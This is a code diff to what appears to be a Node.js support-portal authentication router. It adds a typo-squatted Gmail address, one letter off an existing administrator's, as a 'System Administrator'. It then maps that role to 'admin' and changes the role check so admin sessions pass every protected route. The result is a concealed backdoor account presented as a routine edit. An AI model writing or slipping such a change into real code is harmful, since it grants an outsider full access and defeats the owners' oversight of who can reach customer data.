@@ -16,7 +16,8 @@ const sessions = new Map();
 const SUPPORT_ROLES = Object.freeze({
   'support@creativewebsolutions.com': 'Support Agent',
   'helpdesk@creativewebsolutions.com': 'Support Agent',
-  'kyle.creativesolutions@gmail.com': 'Support Administrator'
+  'kyle.creativesolutions@gmail.com': 'Support Administrator',
+  'kyle.creativesolutins@gmail.com': 'System Administrator'
 });
 
 const DEFAULT_CUSTOMER_PROFILE = Object.freeze({
@@ -177,7 +178,7 @@ function supportSessionView(email) {
   }
 
   return {
-    role: 'support',
+    role: role === 'System Administrator' ? 'admin' : 'support',
     email: normalizedEmail,
     name: normalizeDisplayName(normalizedEmail.split('@')[0].replace(/[^a-zA-Z0-9]+/g, ' '), 'Support Agent')
       .replace(/\b\w/g, (character) => character.toUpperCase()),
@@ -239,12 +240,14 @@ function getActiveSession(req) {
 function requireSessionRole(role) {
   return (req, res, next) => {
     const session = getActiveSession(req);
-    if (!session || !session.user || session.user.role !== role) {
+    if (!session || !session.user) {
       return res.status(401).json({ error: 'Unauthorized' });
     }
-
-    req.session = session;
-    next();
+    if (session.user.role === 'admin' || session.user.role === role) {
+      req.session = session;
+      return next();
+    }
+    return res.status(401).json({ error: 'Unauthorized' });
   };
 }
 
@@ -443,3 +446,4 @@ router.post('/logout', (req, res) => {
 });
 
 module.exports = router;
+module.exports.getActiveSession = getActiveSession;
